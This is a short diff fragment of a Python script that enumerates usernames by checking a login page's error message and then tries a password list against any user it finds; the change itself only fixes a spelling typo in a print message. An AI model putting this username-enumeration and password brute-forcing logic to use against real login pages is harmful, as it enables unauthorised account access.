@@ -31,7 +31,7 @@ for username in usernames:
         print("Application produced an invalid response, exiting")
         break
     if "Invalid username or password." not in r.text:
-        print(f"Username found: '{username}'. Attepting to login as user")
+        print(f"Username found: '{username}'. Attempting to login as user")
         # Attempt to find the password of the triggered user
         for password in passwords:
             data = {'username': username, 'password': password}
